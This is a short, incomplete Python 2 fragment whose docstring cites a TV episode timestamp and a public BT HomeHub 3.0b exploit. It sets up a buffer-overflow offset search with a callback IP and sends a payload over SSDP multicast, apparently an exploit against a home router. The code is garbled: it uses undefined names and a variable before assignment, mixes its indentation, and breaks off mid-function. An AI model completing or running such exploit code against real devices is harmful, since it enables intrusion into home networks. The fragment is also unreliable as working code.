"""
Tehran - s01e08 14:29
  
  Potential Sources:
    - https://github.com/zcutlip/exploit-poc/blob/master/BT/homehub3b/hh3b_exploit.py
    - https://s3.amazonaws.com/zcutlip_storage/BT%20HomeHub3.0b%2044Con%20(Zachary%20Cutlip).pdf

"""

import sys
import os
import environment
import msearch_crash
import struct
import socket
CALLBACK_IP=environment.CALLBACK_IP
QEMU=environment.QEMU

search_string = ""

def exploit():
	if "0xab8f211" == search_string:	
		search_string_num=int(search_string,0)
	        search_string=struct.pack(">L",search_string_num)
	
	offset=buffer_overflow_string.find_offset(search_string)	
	if(offset < 0):	
		print "Couldn't find string %s in the overflow buffer." % search_string
	else:
	        print "Found string %s at\noffset: %d" % (search_string,offset)
	
	if pid:
	    try:
	        logger.LOG_INFO("Sending exploit")
	        send_multicast("239.255.255.250",1900,str(msearch_string))
